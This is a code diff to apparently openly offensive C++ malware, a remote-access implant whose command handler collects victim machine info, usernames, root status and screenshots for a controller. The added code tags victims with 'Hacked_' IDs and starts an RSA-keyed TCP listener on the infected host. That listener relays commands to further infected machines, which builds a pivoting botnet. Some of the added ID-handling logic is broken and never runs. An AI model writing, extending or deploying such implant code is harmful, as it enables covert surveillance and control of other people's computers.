@@ -24,12 +24,16 @@ Author: ISSAC
 #include "clsEDP.hpp"
 #include "clsTools.hpp"
 #include "clsVictim.hpp"
+#include "clsDebugTools.hpp"
 
 #include "clsInfoSpyder.hpp"
 #include "clsScreenshot.hpp"
 #include "clsFileMgr.hpp"
 #include "clsProcMgr.hpp"
 #include "clsServMgr.hpp"
+#include "clsLoader.hpp"
+
+#include "clsLtnTcp.hpp"
 
 std::string g_szIP = "0.0.0.0";
 uint16_t g_nPort = 5000;
@@ -46,10 +50,43 @@ enum enConnectionMethod
     DNS,
 };
 
-void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
+clsLtnTcp* g_ltpTcp = nullptr;
+
+void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vuMsg)
 {
-    if (vsMsg.size() == 0)
+    if (vuMsg.size() == 0)
         return;
+
+    std::string szVictimID = "";
+
+    if (szVictimID.rfind("Hacked_", 0) == 0)
+    {
+        if (szVictimID == "")
+        {
+            szVictimID = vuMsg[0];
+            
+        }
+    }
+
+    clsDebugTools::fnPrintStringList(vuMsg);
+
+    std::vector<std::string> vsMsg;
+    if (szVictimID == "")
+    {
+        vsMsg.insert(vsMsg.end(), vuMsg.begin(), vuMsg.end());
+    }
+    else if (szVictimID == victim.m_szVictimID)
+    {
+        vsMsg.insert(vsMsg.end(), vuMsg.begin() + 1, vuMsg.end());
+    }
+    else
+    {
+        vsMsg.insert(vsMsg.end(), vuMsg.begin() + 1, vuMsg.end());
+        if (g_ltpTcp != nullptr)
+            g_ltpTcp->fnSendToSub(szVictimID, vsMsg);
+
+        return;
+    }
 
     if (vsMsg[0] == "info")
     {
@@ -64,20 +101,23 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
             szImg = clsEZData::fnb64Encode(stImage.vuData);
         }
 
+        victim.m_szVictimID = "Hacked_" + stInfo.m_szMachineID;
+
+
         std::vector<std::string> vsInfo = {
             "info",
             szImg,
             stInfo.m_bHasDesktop ? "1" : "0",
             stInfo.m_szIPv4,
-            stInfo.m_szMachineID,
+            victim.m_szVictimID,
             stInfo.m_szUsername,
             std::to_string(stInfo.m_nUid),
             stInfo.m_bIsRoot ? "1" : "0",
             stInfo.m_szOSName,
         };
 
-
         victim.fnSendCommand(vsInfo);
+
     }
     else if (vsMsg[0] == "file")
     {
@@ -317,6 +357,40 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
     {
 
     }
+    else if (vsMsg[0] == "server")
+    {
+        if (vsMsg[1] == "start")
+        {
+            int nPort = std::stoi(vsMsg[2]);
+            STR szRSAPublicKey = vsMsg[3];
+            STR szRSAPrivateKey = vsMsg[4];
+
+            if (g_ltpTcp != nullptr)
+            {
+                if (!g_ltpTcp->m_bListening)
+                {
+                    //todo: write log.
+                    g_ltpTcp->fnStop();
+                }
+
+                delete g_ltpTcp;
+            }
+
+            g_ltpTcp = new clsLtnTcp(victim, nPort, szRSAPublicKey, szRSAPrivateKey);
+            std::thread([]() {
+                g_ltpTcp->fnStart();
+            }).detach();
+            clsTools::fnLogInfo("OK");
+        }
+        else if (vsMsg[1] == "stop")
+        {
+            if (g_ltpTcp != nullptr && !g_ltpTcp->m_bListening)
+            {
+                g_ltpTcp->fnStop();
+                delete g_ltpTcp;
+            }
+        }
+    }
 }
 
 #pragma region Connection Handler
@@ -367,6 +441,7 @@ void fnTcpHandler(int sktSrv)
             vuDynamicRecvBuf = edp.fnGetMoreData();  // consume one packet
 
             auto [cmd, param, len, vuMsg] = edp.fnGetMsg();
+
 
             // === handle packet ===
             if (cmd == 0)
